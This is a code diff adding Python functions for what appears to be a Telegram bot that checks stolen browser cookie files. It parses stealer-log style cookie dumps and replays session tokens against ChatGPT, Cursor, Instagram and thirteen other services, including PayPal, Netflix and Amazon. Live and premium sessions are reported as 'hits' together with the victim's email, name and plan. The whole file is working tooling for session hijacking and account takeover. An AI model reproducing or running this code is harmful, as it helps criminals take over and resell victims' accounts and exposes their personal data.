@@ -1,0 +1,730 @@
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    CHATGPT COOKIE CHECKER                               ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+import html as _html_mod
+
+
+def cg_extract_session_data(html_content: str) -> Optional[dict]:
+    pattern = r'<script[^>]*id="client-bootstrap"[^>]*>(.*?)</script>'
+    match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
+    if match:
+        try:
+            json_text = match.group(1).strip()
+            if '&quot;' in json_text or '&lt;' in json_text:
+                json_text = _html_mod.unescape(json_text)
+            return json.loads(json_text)
+        except json.JSONDecodeError:
+            return None
+    return None
+
+
+def cg_process_content(content: str) -> Optional[dict]:
+    data = cg_extract_session_data(content)
+    if not data:
+        return None
+    auth_status = data.get('authStatus', 'unknown')
+    session = data.get('session', {})
+    user = session.get('user', {})
+    account = session.get('account', {})
+    return {
+        'status': auth_status,
+        'name': user.get('name', 'Unknown'),
+        'email': user.get('email', 'Not available'),
+        'expiration': session.get('expires', 'Not available'),
+        'plan': account.get('planType', 'free'),
+        'provider': user.get('idp', 'unknown'),
+        'id': user.get('id', 'Not available'),
+    }
+
+
+def cg_extract_cookie_blocks(file_content: str) -> list:
+    blocks = []
+    lines = file_content.replace('\r\n', '\n').replace('\r', '\n').split('\n')
+    current_block = []
+    inside_block = False
+    separator_pattern = re.compile(r'^#-+#$')
+    for line in lines:
+        line = line.rstrip()
+        if separator_pattern.match(line):
+            if inside_block and current_block:
+                blocks.append('\n'.join(current_block))
+            current_block = [line]
+            inside_block = True
+        elif inside_block:
+            current_block.append(line)
+    if inside_block and current_block:
+        blocks.append('\n'.join(current_block))
+    return blocks
+
+
+def cg_find_cookies_in_block(block: str) -> tuple:
+    cookie_0 = None
+    cookie_1 = None
+    user_info = {'username': None, 'browser': None, 'path': None, 'total_cookies': None}
+    lines = block.split('\n')
+    for line in lines[:10]:
+        match_user = re.search(r'@([A-Za-z0-9_\-\.]+)', line)
+        if match_user:
+            user_info['username'] = match_user.group(1)
+        match_browser = re.search(r'/([^/]+)\.txt', line)
+        if match_browser:
+            user_info['browser'] = match_browser.group(1)
+        match_path = re.search(r'# (.*?\.txt)', line)
+        if match_path:
+            user_info['path'] = match_path.group(1).strip()
+        match_count = re.search(r'(\d+) cookie\(s\) found', line)
+        if match_count:
+            user_info['total_cookies'] = match_count.group(1)
+    for line in lines:
+        if '__Secure-next-auth.session-token.0' in line:
+            parts = line.strip().split('\t')
+            if len(parts) >= 7:
+                cookie_0 = parts[6].strip()
+        elif '__Secure-next-auth.session-token.1' in line:
+            parts = line.strip().split('\t')
+            if len(parts) >= 7:
+                cookie_1 = parts[6].strip()
+        elif '__Secure-next-auth.session-token' in line and '.0' not in line and '.1' not in line:
+            parts = line.strip().split('\t')
+            if len(parts) >= 7:
+                token_value = parts[6].strip()
+                if token_value and len(token_value) > 100:
+                    cookie_0 = token_value
+                    cookie_1 = "OLD_FORMAT"
+    return cookie_0, cookie_1, user_info
+
+
+def cg_test_session(cookie_0: str, cookie_1: str) -> Optional[dict]:
+    if not cookie_0 or not cookie_1:
+        return None
+    if cookie_1 == "OLD_FORMAT":
+        cookies = f"__Secure-next-auth.session-token={cookie_0}"
+    else:
+        cookies = f"__Secure-next-auth.session-token.0={cookie_0}; __Secure-next-auth.session-token.1={cookie_1}"
+    url = "https://chatgpt.com"
+    headers = {
+        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        'Accept-Language': "en-US,en;q=0.9",
+        'Upgrade-Insecure-Requests': "1",
+        'Cookie': cookies,
+    }
+    try:
+        response = requests.get(url, headers=headers, timeout=10)
+        response.raise_for_status()
+        return cg_process_content(response.text)
+    except Exception:
+        return None
+
+
+def cg_format_cookie_netscape(cookie_name: str, cookie_value: str) -> str:
+    return f".chatgpt.com\tTRUE\t/\tTRUE\t1779512917\t{cookie_name}\t{cookie_value}"
+
+
+def cg_check_file(filepath: str) -> dict:
+    """Parse a ChatGPT cookie file, return first premium hit if any."""
+    try:
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+    except Exception as e:
+        return {"status": "DEAD", "reason": str(e)[:60], "filename": filepath, "content": ""}
+
+    blocks = cg_extract_cookie_blocks(content)
+    if not blocks:
+        return {"status": "DEAD", "reason": "No cookie blocks found",
+                "filename": filepath, "content": content}
+
+    for block in blocks:
+        cookie_0, cookie_1, user_info = cg_find_cookies_in_block(block)
+        if not (cookie_0 and cookie_1):
+            continue
+        result = cg_test_session(cookie_0, cookie_1)
+        if not result:
+            continue
+        plan = result.get('plan', 'free').lower()
+        if plan == 'free':
+            continue
+        result['user_info']   = user_info
+        result['cookie_0']    = cookie_0
+        result['cookie_1']    = cookie_1
+        result['username']    = user_info.get('username') or 'N/A'
+        result['browser']     = user_info.get('browser')  or 'N/A'
+        result['filename']    = os.path.basename(filepath)
+        result['content']     = content
+        result['plan_upper']  = plan.upper()
+        result['status']      = 'PREMIUM'
+        return result
+
+    # No premium — was there any valid free session?
+    for block in blocks:
+        cookie_0, cookie_1, user_info = cg_find_cookies_in_block(block)
+        if not (cookie_0 and cookie_1):
+            continue
+        result = cg_test_session(cookie_0, cookie_1)
+        if result and result.get('plan', 'free').lower() == 'free':
+            return {"status": "FREE", "filename": os.path.basename(filepath), "content": content}
+
+    return {"status": "DEAD", "reason": "No valid sessions",
+            "filename": os.path.basename(filepath), "content": content}
+
+
+def cg_fmt_premium(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {CG_PREMIUM} <b>CHATGPT PREMIUM HIT!</b>  ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_EMAIL}  <b>Email    :</b> <code>{r.get('email','Unknown')}</code>\n"
+        f"{HS_USER}  <b>Name     :</b> <code>{r.get('name','Unknown')}</code>\n"
+        f"{E_PLAN}  <b>Plan     :</b> <code>{r.get('plan_upper','Unknown')}</code>\n"
+        f"{E_CLOCK}  <b>Expires  :</b> <code>{str(r.get('expiration','Unknown')).split('T')[0]}</code>\n"
+        f"{E_COUNTRY}  <b>Provider :</b> <code>{r.get('provider','Unknown')}</code>\n"
+        f"{HS_USER}  <b>Username :</b> <code>{r.get('username','N/A')}</code>\n"
+        f"{E_FILE}  <b>File     :</b> <code>{r.get('filename','?')}</code>"
+    )
+
+
+def cg_fmt_free(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {CG_FREE} <b>CHATGPT FREE</b>          ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n"
+        f"<i>Free tier — no premium features.</i>"
+    )
+
+
+def cg_fmt_dead(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {CG_DEAD} <b>DEAD COOKIE</b>           ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n"
+        f"{CG_DEAD}  <b>Reason :</b> <code>{r.get('reason','Invalid session')}</code>"
+    )
+
+
+def cg_fmt_single(r: dict) -> str:
+    s = r.get("status")
+    if s == "PREMIUM": return cg_fmt_premium(r)
+    if s == "FREE":    return cg_fmt_free(r)
+    return cg_fmt_dead(r)
+
+
+def cg_fmt_progress(done: int, total: int, premium: int, free: int, dead: int) -> str:
+    pct    = done / total if total else 0
+    filled = int(pct * 10)
+    bar    = "█" * filled + "░" * (10 - filled)
+    return (
+        f"{CG_EMOJI}  <b>ChatGPT Checker</b>\n\n"
+        f"<code>[{bar}]  {int(pct*100)}%</code>\n\n"
+        f"{CG_PREMIUM} Premium : <b>{premium}</b>\n"
+        f"{CG_FREE} Free    : <b>{free}</b>\n"
+        f"{CG_DEAD} Dead    : <b>{dead}</b>\n"
+        f"{E_FILE}  <b>{done}</b> / <b>{total}</b> checked"
+    )
+
+
+def cg_fmt_summary(premium: int, free: int, dead: int, total: int, elapsed: float) -> str:
+    pct = f"{premium / total * 100:.1f}" if total else "0.0"
+    return (
+        f"{E_CHECK} <b>ChatGPT Check Complete!</b>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{E_COUNT} Total    : <b>{total}</b>\n"
+        f"{CG_PREMIUM} Premium  : <b>{premium}</b>  (<i>{pct}% hit rate</i>)\n"
+        f"{CG_FREE} Free     : <b>{free}</b>\n"
+        f"{CG_DEAD} Dead     : <b>{dead}</b>\n"
+        f"{E_CLOCK} Time     : <b>{elapsed:.1f}s</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━"
+    )
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    CURSOR COOKIE ANALYZER                               ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+CURSOR_COOKIES = ["WorkosCursorSessionToken", "cursor_session", "__client"]
+
+
+def cursor_decode_jwt(token: str) -> Optional[dict]:
+    try:
+        token = token.strip()
+        if not token or '.' not in token or len(token) < 50:
+            return None
+        parts = token.split('.')
+        if len(parts) < 3:
+            return None
+        payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
+        decoded = base64.urlsafe_b64decode(payload)
+        return json.loads(decoded)
+    except Exception:
+        return None
+
+
+def cursor_parse_cookies(content: str) -> list:
+    found = []
+    for line in content.strip().splitlines():
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        if '\t' in line:
+            parts = line.split('\t')
+            if len(parts) >= 7:
+                name = parts[5]
+                value = parts[6].strip()
+                if name in CURSOR_COOKIES and value:
+                    found.append({name: value})
+            continue
+        if line.startswith('{'):
+            try:
+                data = json.loads(line)
+                if isinstance(data, dict):
+                    ck = {k: v for k, v in data.items() if k in CURSOR_COOKIES}
+                    if ck:
+                        found.append(ck)
+            except Exception:
+                pass
+            continue
+        if '=' in line and not line.startswith('http') and ';' in line:
+            cookies = {}
+            for pair in line.split(';'):
+                if '=' in pair:
+                    k, _, v = pair.strip().partition('=')
+                    k = k.strip()
+                    v = v.strip()
+                    if k in CURSOR_COOKIES and v:
+                        cookies[k] = v
+            if cookies:
+                found.append(cookies)
+            continue
+        if line.count('.') == 2 and len(line) > 50:
+            found.append({"WorkosCursorSessionToken": line})
+    return found
+
+
+def cursor_check_cookie(cookie_dict: dict) -> dict:
+    token = (
+        cookie_dict.get('WorkosCursorSessionToken') or
+        cookie_dict.get('cursor_session') or
+        cookie_dict.get('__client') or ''
+    )
+    if not token or len(token) < 50:
+        return {"status": "INVALID", "email": "N/A", "plan": "N/A", "details": "No valid token"}
+    data = cursor_decode_jwt(token)
+    if not data:
+        return {"status": "UNKNOWN", "email": "N/A", "plan": "N/A", "details": "Non-JWT token"}
+    exp = data.get("exp")
+    email = data.get("email", data.get("sub", "N/A"))
+    name = data.get("name", "N/A")
+    if exp and datetime.now().timestamp() > exp:
+        return {"status": "EXPIRED", "email": email, "plan": "N/A",
+                "details": f"Expired: {datetime.fromtimestamp(exp).strftime('%Y-%m-%d')}"}
+    sub = data.get("subscription", {})
+    if isinstance(sub, dict):
+        tier = sub.get("tier", sub.get("plan", "free")).upper()
+    elif sub:
+        tier = str(sub).upper()
+    else:
+        tier = str(data.get("plan", data.get("tier", "free"))).upper()
+    is_pro = tier in ["PRO", "PREMIUM", "BUSINESS", "TEAM", "ENTERPRISE", "HOBBY_PRO"]
+    plan_label = tier.title() if tier else "Free"
+    return {
+        "status": "PRO" if is_pro else "FREE",
+        "email": email,
+        "name": name,
+        "plan": plan_label,
+        "tier": tier,
+        "details": f"JWT tier:{tier}",
+        "full_token": token,
+    }
+
+
+def cursor_check_file(filepath: str) -> dict:
+    fname = os.path.basename(filepath)
+    try:
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+    except Exception as e:
+        return {"status": "INVALID", "reason": str(e)[:60], "filename": fname}
+
+    cookies = cursor_parse_cookies(content)
+    if not cookies:
+        return {"status": "INVALID", "reason": "No Cursor cookies found", "filename": fname}
+
+    best = None
+    for ck in cookies:
+        r = cursor_check_cookie(ck)
+        r["filename"] = fname
+        r["content"]  = content
+        if r["status"] == "PRO":
+            return r
+        if best is None and r["status"] == "FREE":
+            best = r
+    return best or {"status": "INVALID", "reason": "All cookies invalid/expired",
+                    "filename": fname, "content": content}
+
+
+def cur_fmt_pro(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {CUR_PRO} <b>CURSOR PRO HIT!</b>       ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{HS_USER}  <b>Name   :</b> <code>{r.get('name','Unknown')}</code>\n"
+        f"{E_EMAIL}  <b>Email  :</b> <code>{r.get('email','Unknown')}</code>\n"
+        f"{E_PLAN}  <b>Plan   :</b> <code>{r.get('plan','Unknown')}</code>\n"
+        f"{SP_BOLT}  <b>Tier   :</b> <code>{r.get('tier','Unknown')}</code>\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>"
+    )
+
+
+def cur_fmt_free(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {CUR_FREE} <b>CURSOR FREE</b>          ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_EMAIL}  <b>Email  :</b> <code>{r.get('email','Unknown')}</code>\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n\n"
+        f"<i>Free tier account.</i>"
+    )
+
+
+def cur_fmt_dead(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {CUR_DEAD} <b>DEAD / INVALID</b>        ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n"
+        f"{CUR_DEAD}  <b>Reason :</b> <code>{r.get('reason', r.get('details','Invalid'))}</code>"
+    )
+
+
+def cur_fmt_single(r: dict) -> str:
+    s = r.get("status")
+    if s == "PRO":  return cur_fmt_pro(r)
+    if s == "FREE": return cur_fmt_free(r)
+    return cur_fmt_dead(r)
+
+
+def cur_fmt_progress(done: int, total: int, pro: int, free: int, dead: int) -> str:
+    pct    = done / total if total else 0
+    filled = int(pct * 10)
+    bar    = "█" * filled + "░" * (10 - filled)
+    return (
+        f"{CUR_EMOJI}  <b>Cursor Analyzer</b>\n\n"
+        f"<code>[{bar}]  {int(pct*100)}%</code>\n\n"
+        f"{CUR_PRO}  Pro   : <b>{pro}</b>\n"
+        f"{CUR_FREE} Free  : <b>{free}</b>\n"
+        f"{CUR_DEAD} Dead  : <b>{dead}</b>\n"
+        f"{E_FILE}  <b>{done}</b> / <b>{total}</b> checked"
+    )
+
+
+def cur_fmt_summary(total: int, pro: int, free: int, dead: int, elapsed: float) -> str:
+    return (
+        f"{E_CHECK} <b>Cursor Check Complete!</b>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{E_COUNT} Total : <b>{total}</b>\n"
+        f"{CUR_PRO} Pro   : <b>{pro}</b>\n"
+        f"{CUR_FREE} Free  : <b>{free}</b>\n"
+        f"{CUR_DEAD} Dead  : <b>{dead}</b>\n"
+        f"{E_CLOCK} Time  : <b>{elapsed:.1f}s</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━"
+    )
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    INSTAGRAM COOKIE CHECKER                             ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+IG_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0"
+
+
+def ig_parse_netscape(content: str) -> dict:
+    cookies = {}
+    for line in content.splitlines():
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        parts = line.split('\t')
+        if len(parts) >= 7:
+            name = parts[5]
+            value = parts[6]
+            if 'instagram.com' in parts[0].lower():
+                cookies[name] = value
+    return cookies
+
+
+def ig_check_cookies(cookies: dict) -> dict:
+    required = ["sessionid", "ds_user_id", "csrftoken", "mid"]
+    missing = [c for c in required if c not in cookies]
+    if missing:
+        return {"status": "INVALID",
+                "reason": f"Missing cookies: {', '.join(missing)}",
+                "cookies": cookies}
+    try:
+        session = requests.Session()
+        for k, v in cookies.items():
+            session.cookies.set(k, v, domain=".instagram.com")
+        headers = {
+            "User-Agent": IG_UA,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Referer": "https://www.instagram.com/",
+            "Upgrade-Insecure-Requests": "1",
+        }
+        response = session.get(
+            "https://www.instagram.com/accounts/edit/",
+            headers=headers,
+            timeout=20,
+            allow_redirects=True,
+        )
+        final_url = response.url
+        status_code = response.status_code
+        if status_code == 200 and "/accounts/edit" in final_url:
+            username = "N/A"
+            m = re.search(r'"username":"([^"]+)"', response.text)
+            if m:
+                username = m.group(1)
+            return {
+                "status": "LIVE",
+                "username": username,
+                "final_url": final_url,
+                "cookies": cookies,
+            }
+        if "/accounts/login" in final_url.lower() or "/login" in final_url.lower():
+            return {"status": "DEAD", "reason": "Redirected to login"}
+        return {"status": "UNKNOWN", "reason": f"HTTP {status_code}"}
+    except Exception as e:
+        return {"status": "INVALID", "reason": str(e)[:80]}
+
+
+def ig_check_file(filepath: str) -> dict:
+    fname = os.path.basename(filepath)
+    try:
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            content = f.read()
+    except Exception as e:
+        return {"status": "INVALID", "reason": str(e)[:60], "filename": fname}
+
+    cookies = ig_parse_netscape(content)
+    if not cookies:
+        return {"status": "INVALID", "reason": "No Instagram cookies",
+                "filename": fname, "content": content}
+    result = ig_check_cookies(cookies)
+    result["filename"] = fname
+    result["content"]  = content
+    return result
+
+
+def ig_fmt_live(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {IG_LIVE} <b>INSTAGRAM LIVE!</b>     ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{HS_USER}  <b>Username :</b> <code>{r.get('username','N/A')}</code>\n"
+        f"{E_CHECK}  <b>Status   :</b> <code>LIVE</code>\n"
+        f"{E_FILE}  <b>File     :</b> <code>{r.get('filename','?')}</code>"
+    )
+
+
+def ig_fmt_dead(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {IG_DEAD} <b>INSTAGRAM DEAD</b>      ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n"
+        f"{IG_DEAD}  <b>Reason :</b> <code>{r.get('reason','Invalid')}</code>"
+    )
+
+
+def ig_fmt_single(r: dict) -> str:
+    if r.get("status") == "LIVE":
+        return ig_fmt_live(r)
+    return ig_fmt_dead(r)
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    COOKIE SCANNER (13 services)                         ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+SCAN_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0"
+
+SCAN_TARGETS = {
+    "netflix":   {"domains": ["netflix.com"],   "url": "https://www.netflix.com/browse"},
+    "spotify":   {"domains": ["spotify.com"],   "url": "https://www.spotify.com/account/overview/"},
+    "facebook":  {"domains": ["facebook.com"],  "url": "https://www.facebook.com/settings"},
+    "instagram": {"domains": ["instagram.com"], "url": "https://www.instagram.com/accounts/edit/"},
+    "tiktok":    {"domains": ["tiktok.com"],    "url": "https://www.tiktok.com/setting"},
+    "youtube":   {"domains": ["youtube.com"],   "url": "https://www.youtube.com/account"},
+    "linkedin":  {"domains": ["linkedin.com"],  "url": "https://www.linkedin.com/mypreferences/d/categories/account"},
+    "amazon":    {"domains": ["amazon.com"],    "url": "https://www.amazon.com/gp/your-account/order-history"},
+    "roblox":    {"domains": ["roblox.com"],    "url": "https://www.roblox.com/home"},
+    "canva":     {"domains": ["canva.com"],     "url": "https://www.canva.com/settings/"},
+    "wordpress": {"domains": ["wordpress.com"], "url": "https://wordpress.com/me/"},
+    "capcut":    {"domains": ["capcut.com"],    "url": "https://www.capcut.com/my-edit"},
+    "paypal":    {"domains": ["paypal.com"],    "url": "https://www.paypal.com/myaccount/profile/"},
+}
+
+
+def scan_parse_netscape(content: str) -> list:
+    cookies = []
+    for line in content.splitlines():
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        parts = line.split('\t')
+        if len(parts) < 7:
+            continue
+        cookies.append({
+            'domain':  parts[0],
+            'path':    parts[2],
+            'secure':  parts[3].upper() == 'TRUE',
+            'expires': parts[4],
+            'name':    parts[5],
+            'value':   parts[6],
+        })
+    return cookies
+
+
+def scan_filter_by_service(cookies: list, service: str) -> list:
+    target_domains = SCAN_TARGETS[service]["domains"]
+    return [c for c in cookies if any(td in c['domain'] for td in target_domains)]
+
+
+def scan_test_service(cookies: list, service: str) -> dict:
+    if not cookies:
+        return {"status": "NONE"}
+    target = SCAN_TARGETS[service]
+    url = target["url"]
+    try:
+        session = requests.Session()
+        for c in cookies:
+            domain = c['domain'].lstrip('.')
+            session.cookies.set(
+                c['name'],
+                str(c['value'])[:4000],
+                domain=domain,
+                path=c['path'],
+                secure=c['secure'],
+            )
+        headers = {
+            "User-Agent": SCAN_UA,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Upgrade-Insecure-Requests": "1",
+        }
+        response = session.get(url, headers=headers, timeout=20, allow_redirects=True)
+        final_url = response.url
+        status_code = response.status_code
+        if any(x in final_url.lower() for x in ['/login', '/signin', '/sign-in',
+                                                 '/accounts/login', '/ap/signin']):
+            return {"status": "DEAD", "message": "Redirected to login", "final_url": final_url}
+        if status_code == 200:
+            username = None
+            for pattern in [r'"username":"([^"]+)"', r'"uniqueId":"([^"]+)"',
+                            r'"display_name":"([^"]+)"']:
+                m = re.search(pattern, response.text)
+                if m:
+                    username = m.group(1)
+                    break
+            return {
+                "status": "LIVE",
+                "final_url": final_url,
+                "status_code": status_code,
+                "username": username,
+            }
+        return {"status": "UNKNOWN", "message": f"HTTP {status_code}", "final_url": final_url}
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:80]}
+
+
+def scan_check_file(filepath: str) -> dict:
+    """Scan a single cookie file against all 13 services."""
+    fname = os.path.basename(filepath)
+    try:
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            content = f.read()
+    except Exception as e:
+        return {"error": str(e)[:60], "filename": fname}
+
+    cookies = scan_parse_netscape(content)
+    if not cookies:
+        return {"error": "No cookies found", "filename": fname}
+
+    results = {}
+    for service in SCAN_TARGETS.keys():
+        filtered = scan_filter_by_service(cookies, service)
+        if filtered:
+            r = scan_test_service(filtered, service)
+            r["cookie_count"] = len(filtered)
+            r["cookies"]      = filtered
+            results[service]  = r
+
+    live = sum(1 for r in results.values() if r.get("status") == "LIVE")
+    dead = sum(1 for r in results.values() if r.get("status") == "DEAD")
+
+    return {
+        "filename": fname,
+        "content":  content,
+        "results":  results,
+        "live":     live,
+        "dead":     dead,
+        "total":    len(results),
+    }
+
+
+def scan_fmt_result(r: dict) -> str:
+    if "error" in r:
+        return (
+            f"╔═══════════════════════════╗\n"
+            f"║  {SCAN_EMOJI} <b>SCAN ERROR</b>           ║\n"
+            f"╚═══════════════════════════╝\n\n"
+            f"{SCAN_DEAD} <b>Reason :</b> <code>{r.get('error','Unknown')}</code>"
+        )
+
+    service_emojis = {
+        "netflix": "🎬", "spotify": "🎵", "facebook": "📘",
+        "instagram": "📸", "tiktok": "🎵", "youtube": "📺",
+        "linkedin": "💼", "amazon": "🛒", "roblox": "🎮",
+        "canva": "🎨", "wordpress": "🌐", "capcut": "✂️",
+        "paypal": "💳",
+    }
+
+    lines = [
+        f"╔═══════════════════════════╗",
+        f"║  {SCAN_EMOJI} <b>SCAN RESULTS</b>         ║",
+        f"╚═══════════════════════════╝",
+        "",
+    ]
+    for service, result in r.get("results", {}).items():
+        icon = service_emojis.get(service, "❓")
+        status = result.get("status", "UNKNOWN")
+        if status == "LIVE":
+            status_str = f"{SCAN_LIVE} <b>LIVE</b>"
+        elif status == "DEAD":
+            status_str = f"{SCAN_DEAD} <b>DEAD</b>"
+        else:
+            status_str = f"{E_CLOCK} <b>{status}</b>"
+        username = result.get("username")
+        user_str = f" <code>{username}</code>" if username else ""
+        lines.append(f"{icon} <b>{service.title()}</b> — {status_str}{user_str}")
+
+    lines.append("")
+    lines.append(f"{E_COUNT} Live: <b>{r.get('live', 0)}</b> | Dead: <b>{r.get('dead', 0)}</b>")
+    return "\n".join(lines)
+
+
+def scan_fmt_progress(done: int, total: int, live: int, dead: int) -> str:
+    pct    = done / total if total else 0
+    filled = int(pct * 10)
+    bar    = "█" * filled + "░" * (10 - filled)
+    return (
+        f"{SCAN_EMOJI}  <b>Cookie Scanner</b>\n\n"
+        f"<code>[{bar}]  {int(pct*100)}%</code>\n\n"
+        f"{SCAN_LIVE} Live    : <b>{live}</b>\n"
+        f"{SCAN_DEAD} Dead    : <b>{dead}</b>\n"
+        f"{E_FILE}  <b>{done}</b> / <b>{total}</b> files"
+    )
+
+
+# ══════════════════════════ END OF CHUNK 4 ══════════════════════════
